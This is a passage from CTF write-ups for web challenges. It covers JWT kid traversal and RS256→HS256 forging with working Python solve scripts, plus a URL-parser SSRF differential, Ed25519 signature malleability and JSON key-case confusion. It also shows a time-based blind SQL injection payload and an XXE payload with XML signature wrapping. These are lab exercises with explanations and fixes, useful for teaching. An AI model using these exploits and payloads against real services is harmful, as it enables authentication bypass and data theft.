fast-uri reads `<gateway>\` as userinfo and checks the host `example.invalid`, which is not quarantined. Node's WHATWG fetch treats `\` as `/` for special schemes, so the host is the real gateway and `/@example.invalid/../dispatch` normalizes to `/dispatch`. The backslash is escaped as `\\` inside the JSON string.

```text
POST /./ops/dispatch  -> HTTP 200 {"status":"delivered", ... Keld Ridge isolation receipt ...}
```

The receipt carried `CSCTF{nkoohtMwUPVjl7ZpLjm9Ejid}`.

*The last blocker — the gateway route.* The signed chain still returned `502 upstream.unavailable` on dispatch, each time taking the upstream down, which looked like an organizer-side crash. The cause was the path: dispatching to the right authority at `/` or at guessed paths kills the upstream. The working route is **`/dispatch` on the gateway's default HTTP port**, and the `/../dispatch` suffix on the WHATWG side of the URL is what lands it there. (Port `:8080` is the dispatcher edge itself; ports 8081–8085 return `gateway_unreachable`.)

**Why it works**

Each control is enforced by a different component, and each pair of components disagrees. The edge and the backend disagree about dot-segments. Uniqueness and roster matching apply different Unicode normalizations, so one engineer's name can be registered under a second spelling. The target validator and the HTTP client disagree on how a backslash in the authority is parsed. The unlock is a public formula with no secret, so it only checks that the client read the schema.

**Validation / reproduction**

The NFKC/casefold mappings and both SHA-256 digests were recomputed offline. The URL differential was re-run offline: Node's WHATWG `new URL()` gave the gateway host and path `/dispatch`, while fast-uri 3.1.7 (the closest version cached locally, not the exact 3.1.2) gave userinfo `<gateway>\` and host `example.invalid` — 3.1.7 also flags an `error` about a literal backslash in the authority, presumably the later fix, so 3.1.2's own behavior was not tested. Saved captures show `same_principal:false` on an order created by two aliases and the scalar-bus `502`. The flag came from the HTTP 200 receipt; Codex submitted it after a `./csctf check 9098` team-solve check and it was accepted on the first attempt.

Reproduction summary (all calls with `curl --path-as-is`):

```text
POST /./ops/delegates       {"name":"k.vostrª"}                                  -> tok-1
POST /./ops/delegates       {"name":"r.mendªl"}                                  -> tok-2
POST /./ops/orders          {"bus":["KR-B1","KR-B2"],"requester_token":"tok-1"}  -> ord-3 (awaiting_approval)
POST /./ops/orders/approve  {"order_id":"ord-3","approver_token":"tok-2"}        -> signed
# unlock = sha256("interlock|ord-3|KR-B1,KR-B2") = 56da3ce3...4ab838
POST /./ops/dispatch        {"order_id":"ord-3",
                             "target":"http://<gateway>\\@example.invalid/../dispatch",
                             "unlock":"56da3ce3...4ab838"}                        -> 200 delivered + receipt
```

Gotchas: send the path byte-for-byte (`--path-as-is`); `bus` must be a JSON array or the approve `502`s and kills the instance; the target must resolve to the real gateway host at `/dispatch` on its default port; and a loopback/Unicode/integer-IPv4 target is rejected (`bad_target`), so the published gateway hostname is the only one that works.

### Key Custody

> Web · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — a per-team value returned by `/admin/recovery-key` once the forged admin token is
accepted. JohnG4lt holds the credited solve; the route and signing script below are his, and the
per-instance flag string itself was not saved (the instance is now closed).

**Challenge**

A key-custody console issues an HS256 analyst session and serves its brand assets publicly. `GET /token`
hands out the analyst JWT, `GET /schema` is self-describing, and `/public/<name>` serves brand files. The
goal is the admin-only recovery key at `GET /admin/recovery-key`. The challenge name is the hint: the HMAC
signing key is not a hidden secret — it is a file the client can also download.

**Approach**

1. **Read the contract.** `GET /schema` documents that the verifier loads its HS256 key using the JWT
   header's `kid`, and that `/public/{name}` serves public brand assets. `GET /token` issues the analyst
   JWT. Decode its header and payload and keep the existing `sub` claim.
2. **Grab the key file.** Fetch `/public/brand.txt` and keep the exact response bytes, trailing newline
   included — those raw bytes are the HMAC key. (A truncated or newline-stripped copy produces a wrong
   signature, so preserve them verbatim.)
3. **Rewrite the header and payload.** Set the header to
   `{"alg":"HS256","typ":"JWT","kid":"../public/brand.txt"}` and change the issued payload's `role` to
   `admin`. The `../` escapes the key directory the verifier would otherwise constrain the `kid` to, and
   lands on the public brand file.
4. **Sign it.** Base64URL-encode the compact header and payload (no padding), HMAC-SHA-256 the literal
   `<header>.<payload>` string using the raw `brand.txt` bytes as the key, and Base64URL-encode the
   digest (no padding). The signature covers the header — including `kid` — so both header and payload
   must be final before signing.
5. **Send it.** Present the forged token as `Authorization: Bearer <token>` to `GET /admin/recovery-key`.
   This endpoint takes a Bearer header, not a browser cookie.

Manual route (how it was first done): on [jwt.io](https://www.jwt.io/), edit the issued token's header
and `role`, paste the exact `brand.txt` bytes into the HS256 secret field (Base64 option off), and copy
the resulting token into the `Authorization: Bearer` header for `/admin/recovery-key`.

Automated solve (`solve.py`):

```python
import base64, hashlib, hmac, json, urllib.request

base = "<URL>"
get = lambda path: urllib.request.urlopen(base + path).read()
b64 = lambda data: base64.urlsafe_b64encode(data).rstrip(b"=").decode()

issued = json.loads(get("/token"))["token"]
_, part, _ = issued.split(".")
claims = json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
claims["role"] = "admin"

key = get("/public/brand.txt")                       # raw file bytes = HMAC key
header = b64(json.dumps(
    {"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"},
    separators=(",", ":")).encode())
payload = b64(json.dumps(claims, separators=(",", ":")).encode())
message = f"{header}.{payload}"
signature = b64(hmac.new(key, message.encode(), hashlib.sha256).digest())
token = f"{message}.{signature}"

req = urllib.request.Request(base + "/admin/recovery-key",
                             headers={"Authorization": f"Bearer {token}"})
print(urllib.request.urlopen(req).read().decode())
```

**Why it works**

`kid` is supposed to be a key *identifier*, not a path and not a file-inclusion feature. This verifier
uses the attacker-supplied `kid` to build a local key-file path without constraining it to the key
directory, so a `../` component escapes into `/public/` — a local file inclusion in the key-lookup step.
The verifier then opens `/public/brand.txt` and uses its bytes as the HS256 key. Because that file is
public by design, the attacker knows the exact symmetric key and can mint a validly-signed token with any
claims. A symmetric signature only proves the signer knew the key; when the key is a downloadable file,
it proves nothing.

**Validation**

The forged Bearer token was accepted at `/admin/recovery-key` on the live instance, which returned the
challenge flag. The route is fully reproducible with the script above against a fresh instance. The
literal flag string was read from the live response and not recorded in our workspace.

### keyring

> Web · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{hHlqboaWKbFgNq25c8RxW0aD}
```

Read from the admin console's "Break-glass access" panel and accepted on the first submission.

**Challenge**

> Kestrel ID is the staff sign-on for the Vardanne Joint Operations Directorate, which coordinates
> Vardanne's part in the Operation Dawn coalition. Liaison officers can request an account and sign in
> straight away, but the administration console is limited to directorate administrators, and it holds
> the break-glass recovery key. Recover that key. Start your own instance from this page and work only
> against the address it gives you.

A per-team web container (CTFd `docker_per_team` plugin, port 9999). No files were attached; the whole
challenge lives on the instance. Kestrel ID is a staff sign-on with open self-registration and an
admin console that holds the break-glass recovery key. All requests went only to our own spawned
instance (`<instance>`).

**Approach / walkthrough**

*Recon.* The recon stage of `workspace/9117-keyring/exploit.py` fetched a fixed list of pages (the
app's nav links plus well-known paths — not a scan):

| Path | Result |
| --- | --- |
| `/register` | open self-registration: username, password (min. 12 chars), optional full name / organisation |
| `/admin` | unauthenticated → redirect to `/login` (saved body is the "Redirecting..." stub) |
| `/developers` | integration docs for the session token |
| `/.well-known/kestrel-id.pem` | the token-signing **RSA public key** (SubjectPublicKeyInfo PEM) |
| `/.well-known/jwks.json`, `/.well-known/openid-configuration` | not present (app's "Page not found") |
| `/static/js/kestrel.js` | UI only (password reveal, expiry notice); nothing auth-related |

`/developers` laid out the whole token design: the session is a stateless **JWT** in the `session`
cookie (HttpOnly, SameSite=Lax), issuer `https://id.vjod.internal`, audience `vjod-staff`, 8-hour
lifetime, claims `sub`, `role`, `iat`, `exp`, `jti`, plus a key ID `beec83e6042a9411` and a "Download
kestrel-id.pem" link. The page says the key pair is regenerated every time the service restarts, so
the forge must fetch the **live** PEM from the running instance — a PEM saved at 08:04 during an
earlier recon had a different key (DER SHA-256 prefix `cb79dc3f267b6f5b`) than the solving instance
(`beec83e6042a9411...`). The key ID is the first 16 hex digits of SHA-256 over the DER
SubjectPublicKeyInfo. A freshly registered liaison account gets an **RS256** token with a non-admin
`role` (`user`).

*Key insight — RS256→HS256 algorithm confusion.* Authorization depends entirely on the `role` claim
inside a token the client holds, and the server publishes the verification key. If the verifier takes
the algorithm from the token header and passes the same key material to whichever check that algorithm
selects (the classic `jwt.decode(token, key)` mistake), then a token with header `alg: HS256` is
checked as an HMAC keyed with the **public key bytes**. The public key is public, so anyone can sign
as anyone. This exact hypothesis was written in `notes.md` after the first recon, with `alg=none` and
`kid`/`jku` tricks kept as fallbacks.

*Exploit* (`exploit.py <host> forge`):

1. Register a fresh liaison account (`liaison<hex>`) through `/register` and log in if no cookie was
   set yet. Read the RS256 `session` cookie.
2. Decode its header and payload, then fetch the live PEM from `/.well-known/kestrel-id.pem`.
3. Copy the payload, set `role` to `admin`, push `exp` out one hour; every other claim (`sub`, `iss`,
   `aud`, `iat`, `jti`) stays as issued.
4. Set the header's `alg` to `HS256`, keep the other header fields, and sign
   `base64url(header) + "." + base64url(payload)` with HMAC-SHA256, using the **raw PEM bytes** as the
   secret:

   ```python
   hh = dict(H); hh['alg'] = 'HS256'
   si = b64u(json.dumps(hh, separators=(',', ':')).encode()) + '.' + \
        b64u(json.dumps(P2, separators=(',', ':')).encode())
   sg = b64u(hmac.new(pem, si.encode(), hashlib.sha256).digest())
   token = si + '.' + sg
   ```

5. `GET /admin` with `session=<forged token>`. The script tries a short, ordered list of key-byte
   variants (raw PEM, stripped, stripped plus `\n`) and the fallbacks (`alg=none`, signature reuse),
   stopping at the first `CSCTF{...}` in the response. Per `notes.md`, the token keyed with the **raw
   PEM bytes** is the one that worked.

`/admin` returned 200, showed "Signed in as liaisona3fc13" and the full directory (12 accounts), and
under **Break-glass access** listed:

```
Break-glass recovery key   CSCTF{hHlqboaWKbFgNq25c8RxW0aD}
Custodian                  J6 Identity Services
```

The exploit was prepared in advance while our three-instance cap was full (`READY.md`), so the live
solve took under a minute: the recon pages are stamped 08:12:55–08:12:56, the admin page and live PEM
08:13:09 (about 15 s of scripted work), and `FLAG.txt` plus the submit record 08:13:40. The instance
was stopped afterwards.

**Why it works**

The verifier takes the algorithm from the token header and passes the same key material to whichever
check that algorithm selects. With `alg: HS256`, the "public key" becomes an HMAC secret — and the
server publishes that secret at `/.well-known/kestrel-id.pem`. Authorization rests entirely on the
self-asserted `role` claim, with no server-side role lookup by `sub`, so this single confusion is
enough for full admin access. The fix is to pin `algorithms=["RS256"]` and use a key object typed for
asymmetric verification only; a server-side role lookup by `sub` would also have stopped it.

**Validation / reproduction**

The forged token was accepted by `/admin`, where a non-admin token had been redirected to `/login`;
the recovery key appeared in a `CSCTF{...}` frame on the admin page and was submitted once through the
guarded CLI and accepted as correct (`tried.json`: one attempt, status `correct`).

```bash
# 1. spawn the per-team instance (cap 3 concurrent; this one waited for a free slot)
.venv/bin/python -c "from ctf.client import connect; from ctf.instances import Instances; print(Instances(connect()).spawn(9117))"
# 2. recon (saves pages to the scratchpad)
.venv/bin/python workspace/9117-keyring/exploit.py <host> recon
# 3. register + forge the HS256 admin token + read /admin (writes FLAG.txt)
.venv/bin/python workspace/9117-keyring/exploit.py <host> forge
```

Gotchas: fetch the PEM from the live instance every time — the key pair regenerates on restart, so a
PEM from an earlier instance will not verify. Sign with the raw PEM bytes exactly as served (the
stripped and `\n` variants were tried but the raw bytes worked), and keep all other claims unchanged.

Both details are confirmed from the saved recon: `/developers` documents "Signature public key — Key
ID `beec83e6042a9411` — Download kestrel-id.pem (PEM, SubjectPublicKeyInfo)," and states "The key
changes whenever the service restarts, so fetch it at start-up and again when a signature stops
verifying." The RS256→HS256 algorithm confusion is keyed with the raw bytes of
`/.well-known/kestrel-id.pem`, with `role=admin`, read via `GET /admin`.

### Landfall

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 741 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{bfyGvnx2hgPluW3G99kBQG8r}
```

Recovered from the broadcast centre's `release_digest` (the confirmation code returned when the cancellation went on air), then submitted.

**Challenge**

Cyclone Meren is near landfall on the Astrenian coast. A fabricated evacuation order has gone out under ANWA authority, sending two coastal districts inland along Route N2 straight into the surge zone, and every dispatcher role was revoked at 03:11. What is left is an observer account on the National Alert Origination Gateway; the broadcast centre behind it still honours authorised cancellations. Without a dispatcher role, the task is to authorise a cancellation of the fabricated order and get it on air — the confirmation code is revealed when the cancellation is broadcast. There are no attachments, so this is black-box against our own instance. What the observer lacks is two things: an operation the gateway refuses to observers, and a **fresh** single-use Ed25519 dispatch grant. The fix for each is a parser or verifier differential between the gateway and the broadcast centre behind it.

**Tools used**

Python, used offline to decode the grants, check their time windows against the frozen clock, do the Ed25519 `S + kL` arithmetic and compute the unlock digest.

**Approach / walkthrough**

*Reconnaissance (read-only, GETs only, on our instance).* The `/` console shows the observer credential (operator `r.tolm`, role `observer`, authority `NAA-05`) and the line "Observer sessions may preview and read the ledger; dispatch is held." `GET /api/v1/schema` holds the contract. The parts that drove the solve:

- `operations`: `preview` is allowed for observers, `dispatch` needs a dispatcher, `cancel` is "reserved".
- `submission.paths`: `/api/v1/orders`, `/orders/batch`, `/orders/staged`. "Two of the three were rewritten in the v2 cycle with a validating decoder; one is still the v1 passthrough." The error `duplicate_member` is "400 the v2 decoder rejected duplicate member names".
- `grant`: `{payload, sig}`, where `sig` is a "64-byte detached Ed25519 signature over the exact decoded bytes of payload … a capability, not a content signature". `single_use` is "enforced by the broadcast centre. See /audit/ledger for the key used."
- `release_unlock`: `sha256-hex("landfall|<cancelled identifier>|<grant jti>|<area sorted, comma-joined>")`.
- `cap.references`: the triple `sender,identifier,sent` of the message being cancelled.

`/feed/cap/current` gives the on-air fabricated order `ANWA-CAP-758d0ad3-563f`, sender `alerts@anwa.astrenia.test`, sent `2026-11-07T02:53:00+00:00`, Extreme, areas `AS-MER` and `AS-CAP`. `/reference/clock` shows operational time frozen at `2026-11-07T03:26:00Z`, and grant `nbf`/`exp` are checked against it. Each `/feed/cap/archive/<id>` message carries its signed grant in an XML comment. We decoded all eleven and checked each window against the frozen clock. Only `ANWA-CAP-cfd82d14-4c47` has a grant that covers both target areas at Extreme and is still valid: jti `G-1b71cf7fbe`, auth `NAA-03`, `sev_max` Extreme, geo `AS-MER, AS-CAP, AS-VEN`, valid 2026-11-06T23:26Z to 2026-11-07T11:26Z. Every archived grant had a canonical `S < L`.

*1. The ledger shows the replay key and a malleable signature already in use.* Logged in as the observer (`POST /api/v1/session`), `GET /audit/ledger` showed that the on-air fabricated alert had itself reused grant `G-1b71cf7fbe`, with an Ed25519 signature whose scalar `S` was **not reduced mod L**. The hash of the archived canonical signature matched the first consumed ledger entry, and `S + L` matched the attacker's second consumed entry. So the single-use check keys on a hash of the signature bytes (not the jti), and the broadcast centre's verifier accepts non-canonical `S`. Therefore `S + 2L` is a signature that still verifies under a lax verifier but has never been consumed:

```python
L = 2**252 + 27742317777372353535851937790883648493
raw = b64url_decode(sig)                       # archived sig of G-1b71cf7fbe
S   = int.from_bytes(raw[32:], "little")
sig2L = raw[:32] + (S + 2*L).to_bytes(32, "little")
sha256(sig2L)  # 55cc23bf137b6a717aa53087dd39597e39a7dc788418980b0ab9ac676e0b2c42
```

Re-run offline from the saved archive grant, the `S + 2L` SHA-256 matches `notes.md` exactly (taken over the raw 64 signature bytes). For reference, the canonical (`k=0`) raw-bytes hash is `dd213b9c...` and `S+L` (`k=1`) is `9dfdc27b...`. But a conformant verifier (RFC 8032 requires `S < L`) rejects `S + 2L`, so getting the malleated signature past the gateway while still delivering it to the lax broadcast centre is the next step.

*2. Find the v1 passthrough and exploit case-insensitive vs exact key binding.* Probing the three submission paths showed that `/orders/batch` and `/orders/staged` reject duplicate members (`duplicate_member`), so only **`/api/v1/orders`** is the v1 passthrough. On that path plain duplicate keys were not the working differential — key **case** was. The gateway binds JSON members case-insensitively, while the broadcast centre looks up the exact lowercase key, so one body can carry two values for each field, one per layer:

| Field | Gateway reads (case-insensitive) | Broadcast centre reads (exact key) |
| --- | --- | --- |
| operation | `"Operation": "cancel"` — passes the observer-role policy | `"operation": "dispatch"` |
| grant signature | `"Sig"`: canonical archived signature — passes the strict verifier | `"sig"`: unseen `S + 2L` — passes the lax verifier, new to the ledger |

*3. Build the body.* The rest was a CAP payload:

- `payload`: CAP with `msgType: "Cancel"` and `references: "alerts@anwa.astrenia.test,ANWA-CAP-758d0ad3-563f,2026-11-07T02:53:00+00:00"`, areas `AS-MER` and `AS-CAP`.
- `authorization.payload`: the archived `G-1b71cf7fbe` claims, unchanged.
- `unlock`, from the schema formula (area is the payload's area, sorted):

```
sha256("landfall|ANWA-CAP-758d0ad3-563f|G-1b71cf7fbe|AS-CAP,AS-MER")
  = 4be9acc97f77aec0f61d2b1a9344c3bddcbb27b55173b8ae1d1266ac61d7f14c
```

*4. Broadcast.* The broadcast centre accepted the cancellation and the result was `BROADCAST` on `CBS-4370`. It withdrew the fabricated evacuation order and returned the confirmation code as `release_digest`: `CSCTF{bfyGvnx2hgPluW3G99kBQG8r}`.

**Why it works**

Ed25519 signatures are malleable unless the verifier enforces `S < L`: `S` and `S + kL` give the same verification equation. A replay guard keyed on a hash of the signature bytes therefore treats each `k` as a fresh grant — the ledger showed the attacker had already done this once (`k=0` then `k=1`), leaving `k=2` unused. The gateway runs the strict checks (role policy, canonical signature) but the component that acts on the request reads different JSON members, because the two layers bind keys with different case rules. Each layer is satisfied by its own copy of each field: the observer-allowed `cancel` and the canonical `Sig` clear the gateway, while `dispatch` and the fresh `sig` reach the broadcast centre.

**Validation / reproduction**

The canonical and `S + L` hashes matched the ledger's two consumed entries before the request was sent, which confirmed the replay key and the signature-bytes keying. The `S + 2L` hash (`55cc23bf...`) and the unlock digest (`4be9acc9...`) were recomputed offline from the saved archive grant and matched the notes. The broadcast response contained the `CSCTF{...}` code, and we submitted it.

Reproduction: as the observer, decode the eleven archived grants and pick the one valid against the frozen clock covering `AS-MER`/`AS-CAP` (`G-1b71cf7fbe`); read `/audit/ledger` to confirm the replay guard keys on the signature hash and accepts non-canonical `S`; compute `S + 2L` and the unlock digest; then `POST /api/v1/orders` with one JSON body carrying both `Operation: cancel` / `operation: dispatch` and both `Sig` (canonical) / `sig` (`S + 2L`), a CAP `Cancel` payload with the `references` triple, the unchanged grant claims, and the unlock. Gotchas: only `/api/v1/orders` is the v1 passthrough (`/orders/batch` and `/orders/staged` reject duplicate members); the differential is key **case**, not plain duplicate keys; and the unlock area list is the payload's areas sorted (`AS-CAP,AS-MER`).

### Operation Dawn: The Access Log

> Web · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{07_beacon_tow_vigil_bollard_8c0371}`

This is an OSINT-style freeform value that carries its own braces — it was submitted exactly as recovered, not re-wrapped.

**Challenge**

Operation Dawn, annex entry 07. Coalition cyber teams seized the web server log from an enemy status portal that fronted a canal checkpoint. One visitor "walked out of the portal's database with the checkpoint's link secret and never drew an error page." The job is to recover what they took and submit it as recovered; it already carries its own braces. The attachment is `access.log` (514,137 bytes, SHA-256 `3bb180802cc90b56984f179cb4315fc805d1e047e8a2374544044858fea30db2`): nginx combined format with one extra field per line, `rt=<seconds>`, the request time.

**Approach / walkthrough**

*Tools:* `shasum` to verify the file, `awk` and `grep` to profile the log, and a short standard-library Python script to rebuild the secret.

*1. Verify the attachment.* `shasum -a 256 access.log` matches the brief's hash, so the log is the one described.

*2. Single out the one visitor who never drew an error page.* Count requests and 4xx/5xx responses (field 9 is the status) per client IP, then see who sent SQL-looking characters:

```sh
awk '{n[$1]++; if ($9>=400) e[$1]++} END {for (ip in n) printf "%5d %3d %s\n", n[ip], e[ip], ip}' access.log | sort -rn | head -3
grep -E "%27|'" access.log | awk '{c[$1" "$9]++} END {for (k in c) print c[k], k}'
```

```
 2666   0 198.51.100.66
   23   0 203.0.113.136
   19   0 192.0.2.76
2665 198.51.100.66 200
```

Four other IPs drew errors, but they are plain scanners (8 requests each for `/.env`, `/.git/config`, `/wp-login.php`, `/phpmyadmin`, all 403/404). One client, `198.51.100.66`, sent 2666 of the ~2900 requests, every one answered `200`, and it is the only client sending quotes (`'` or `%27`). That is the exfiltrator — and it never drew an error page.

*3. Read the attack.* Save and inspect its lines, then compare response size (field 10) against request time bucketed to whole seconds:

```sh
mkdir -p out && grep '^198\.51\.100\.66 ' access.log > out/attacker.log
awk '{t=$NF; sub(/rt=/,"",t); c[$10" rt="int(t)".x"]++} END {for (k in c) print c[k], k}' out/attacker.log | sort -rn
```

```
198.51.100.66 ... "GET /api/status?unit=43 HTTP/1.1" 200 88 ... rt=0.003
198.51.100.66 ... "GET /api/status?unit=43'+AND+IF(SUBSTR(token,6,1)='Z',SLEEP(2),0)--+- HTTP/1.1" 200 33 ... rt=0.057
2624 33 rt=0.x
41 33 rt=2.x
1 88 rt=0.x
```

After one normal `GET /api/status?unit=43`, every probe is

```
unit=43' AND IF(SUBSTR(token,<pos>,1)='<char>',SLEEP(2),0)-- -
```

— "if character `<pos>` of the `token` column equals `<char>`, sleep 2 seconds." Every probe returns the same 33-byte body, so neither the size nor an error page leaks anything; the only signal is `rt=`. Exactly 41 probes took ~2 s, the rest finished in milliseconds. Two traps: the probes arrive in shuffled position order, so reading the slow lines top to bottom gives scrambled text (`b`, `g`, `_`, …); and some guessed characters are URL-encoded (`%7D` is `}`), so the query must be decoded before reading the character.

*4. Rebuild the secret.* A script URL-decodes each probe, parses `(position, char)`, keeps the guesses whose request took at least 1.5 s, checks there is exactly one per position, and joins them in position order:

```python
import re, sys
from collections import defaultdict
from urllib.parse import unquote_plus

LINE  = re.compile(r'"GET (\S+) HTTP/[\d.]+" (\d+) (\d+) .* rt=([\d.]+)$')
PROBE = re.compile(r"IF\(SUBSTR\((\w+),(\d+),1\)='(.*)',SLEEP\((\d+)\),0\)")
THRESHOLD = 1.5  # true guesses sleep 2 s, false ones answer in ms

hits = defaultdict(list); positions = set()
for line in open(sys.argv[1], encoding="utf-8"):
    m = LINE.search(line)
    if not m: continue
    p = PROBE.search(unquote_plus(m.group(1)))   # '+'->space, %7D->'}'
    if not p: continue
    pos, char = int(p.group(2)), p.group(3)
    positions.add(pos)
    if float(m.group(4)) >= THRESHOLD:
        hits[pos].append(char)

secret = []
for pos in sorted(positions):
    chars = hits.get(pos, [])
    if len(chars) != 1:
        sys.exit(f"position {pos}: ambiguous/missing {chars}")
    secret.append(chars[0])
print("".join(secret))
```

```sh
python3 rebuild.py out/attacker.log
```

```
probes: 2665, column: token, positions: 1..41
char: CSCTF{07_beacon_tow_vigil_bollard_8c0371}
CSCTF{07_beacon_tow_vigil_bollard_8c0371}
```

Each of the 41 positions has exactly one slow guess, with no ambiguity and no gaps. Joined in order they spell the token, which already carries its `CSCTF{...}` braces, so it is submitted as recovered.

**Why it works**

The `unit` parameter of `/api/status` is concatenated into a SQL query, so the attacker appended `AND IF(condition, SLEEP(2), 0)` to turn the endpoint into a time-based blind-SQLi oracle. The page content never changes and nothing errors — which is exactly why the visitor "never drew an error page" — but the database stalls for 2 seconds whenever the guessed character is correct. nginx's `rt=` field records that stall, so the captured log alone holds every answer the oracle ever gave: for each position, the single guess that took ~2 s is the real character of the `token` column. Sorting those answers by position rebuilds the secret. No access to the live server is needed; the forensic log is self-contained.

**Validation / reproduction**

Each of the 41 probed positions had exactly one guess above the 1.5 s threshold — no ambiguity, no gaps — and the rebuilt string is a well-formed value framed by `CSCTF{...}`, matching the brief's note that the secret carries its own braces. It was accepted on the first submission. To reproduce: verify the SHA-256, isolate `198.51.100.66` as the all-`200`, quote-sending client, then run the decoder over its lines. Gotchas: decode `unquote_plus` before parsing (characters like `}` appear as `%7D` and `+` means space), and do not read the slow lines in file order — they are deliberately shuffled across positions, so reorder by the `SUBSTR(...,<pos>,...)` index.

### Operation Dawn: The Command Seal

> Web · Medium · Terminal43  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{pXNUmFrJMSLoXKlufzq7fcqU}`

**Tools used**

Codex (run under human guidance), which worked the chain against the live instance and submitted the accepted flag; no source was provided, so it reasoned from the live API, with `curl`-style HTTP requests and a local SHA-256 to check the digest model.

**Challenge**

"Operation Dawn, annex entry 18. The Ash relay only acts on orders that carry command's seal, and command never puts its standing order on the wire." We can file field reports to the relay and submit orders to it, but we do not hold command's key. The task is to make the relay give up command's standing order anyway.

The challenge ships as a per-team Docker container (`csctf26/web-thecommandseal:1`, internal port 8066) with no downloadable attachments, so every step is live black-box work against the single assigned instance (`http://<instance>`). Reading the flavour text as a threat model: orders must carry an RSA signature made with a key we don't have; there are two reachable endpoints (file a report, submit an order); and the flag is the server-side "standing order", released only when the relay *acts on* an order of that kind.

**Approach**

The relay exposes two XML endpoints. `POST /report` files a field report and reflects its `<summary>` back in the response. `POST /order` accepts an order document and only acts on an order that carries command's RSA seal. The order grammar is:

```xml
<relay>
  <order id="...">
    <kind>...</kind>
    <text>...</text>
  </order>
  <auth>
    <ref>...</ref>
    <digest>...</digest>   <!-- base64 SHA256 -->
    <sig>...</sig>         <!-- 2048-bit RSA signature -->
  </auth>
</relay>
```

The page also references an outbox path: `/opt/relay/outbox/last-order.txt`.

1. **Confined XXE in `/report`.** `/report` parses the posted XML with an external-entity-resolving parser and reflects `<summary>` back, giving an XXE file-read primitive. But the resolver is locked down: traversal, `/etc/*`, and every other path return "order could not be parsed". The one path that resolves is exactly the advertised outbox, `/opt/relay/outbox/last-order.txt`. Pulling that file through an external entity leaked a complete, validly signed order:
   - `id = cmd-6002`
   - `kind = routine`
   - `text = "hold the canal checkpoint and report at dusk"`
   - `ref = cmd-6002`
   - `digest` (base64 SHA-256) = `3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=`
   - `sig` = command's 2048-bit RSA signature

2. **Reverse the seal model.** Recomputing `SHA256("cmd-6002|routine|hold the canal checkpoint and report at dusk")` locally reproduced the leaked digest byte for byte, so the digest is `SHA256(id|kind|text)` — the three fields pipe-joined. Submitting variations to `/order` and watching accept/reject showed that the signature is valid over `H(ref || digest)` under command's public key, and that `ref` is bound in: changing `ref` alone returns "signature invalid". We have no private key and the XXE cannot reach key material, so a straight crypto forgery is out. The signature over the leaked `cmd-6002` order is the only valid seal we hold, and it is tied to `kind=routine` / `text="hold the canal checkpoint..."`.

3. **Verify/act mismatch (XML Signature Wrapping).** The relay verifies the `<order>` whose `id` matches `<auth><ref>` (here `cmd-6002`), but it *acts on* the **first** `<order>` element in the document. When those are two different elements, verification succeeds against the signed order while the relay executes a different, attacker-chosen order — classic XSW. The release verb for the flag is `kind=standing`.

4. **Forge and fire.** Post one `<relay>` with a forged `standing` order first and the leaked `cmd-6002` order second (present only to satisfy the signature check), followed by the leaked `<auth>` block:

```xml
<relay>
  <order id="q"><kind>standing</kind><text>x</text></order>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth>
    <ref>cmd-6002</ref>
    <digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest>
    <sig>FEbT3he...8DDow==</sig>   <!-- the leaked cmd-6002 RSA signature -->
  </auth>
</relay>
```

Verification runs against `id="cmd-6002"`, the digest and signature match, so it passes. The relay then acts on the first order (`id="q"`, `kind=standing`) and replied:

```
command standing order honoured: CSCTF{pXNUmFrJMSLoXKlufzq7fcqU}
```

**Why it works**

The RSA signature and the digest are both sound. The flaw is that the relay selects the signed element and the executed element by different rules: it verifies the one that matches `ref` and executes the first one in the document. Any validly signed order can therefore authorize an arbitrary order placed in front of it. The confined XXE supplied that one signed order. The challenge narrowed the entity resolver to just the outbox file, but that single file was enough to seed the wrapping attack. No key, length extension, or `alg` downgrade is needed — those were early hypotheses in the prepared kit (`exploit.py`: JWT `alg=none`, RS256→HS256, length extension) and were all ruled out once the order format turned out to be XML with a detached RSA signature.

**Validation / reproduction**

The locally recomputed `base64(SHA256("cmd-6002|routine|hold the canal checkpoint and report at dusk"))` reproduces the recorded digest `3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=` exactly, which independently confirms both the pipe-join digest model and the leaked-order field values before the wrapped order was ever sent. The relay's response carried the flag; Codex submitted it and it was accepted on the first submission. The whole solve took about 25 requests against our single assigned instance — no sweeping, no mass scanning, no instance start/stop churn.

Reproduction in short: (1) XXE-read `/opt/relay/outbox/last-order.txt` via `/report`; (2) confirm the digest model locally; (3) POST the two-order wrapped document above to `/order` with the leaked `<auth>` block; (4) read the flag from the response.

Gotchas: the XXE resolver is confined to the outbox path only — traversal and `/etc/*` fail, so don't waste requests there. The full `<sig>` base64 is abbreviated in the notes (`FEbT3he...8DDow==`), so the exact signature bytes are not reproduced here; they are taken verbatim from the leaked order. The XXE-confinement behaviour, the `H(ref||digest)` verification model, the verify-vs-act selection rule, the exact response string, and the ~25-request count are attested by `notes.md` only — no source, saved HTTP transcript, or live instance remains to re-derive them against.

### Operation Dawn: The Dispatch Console

> Web · Medium · Terminal43  
> Points: 271 · Flag submitted by: secretNinja

**The flag**

`CSCTF{GlYld1ix0KH8n7UuacXqn3cD}`

**Tools used**

`curl`-style hand-built form requests. A local SQLite shell was used to check payload shape and length offline before each live request. Codex, run under human steering, solved this challenge and handed the result back — Codex made no submission; the team verified and submitted once (byline: secretNinja).

**Challenge**

"Operation Dawn, annex entry 08. We captured the Ash field dispatch console and stood it back up. A plain visitor can read and file dispatches, but the command net is locked and its standing order with it. The console runs everything past a sanitiser before it touches the database. Get command's standing order."

